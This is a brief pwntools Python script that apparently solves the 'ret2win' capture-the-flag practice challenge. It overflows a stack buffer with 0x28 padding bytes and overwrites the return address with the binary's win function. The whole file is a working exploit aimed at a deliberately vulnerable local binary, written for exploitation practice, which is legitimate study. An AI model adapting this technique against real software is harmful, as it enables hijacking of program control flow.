from pwn import *

p = process('./ret2win')
elf = ELF('./ret2win')

p.recvuntil('>')

payload = 'a'*0x28 + p64(elf.symbols['ret2win'])
p.sendline(payload)

p.interactive()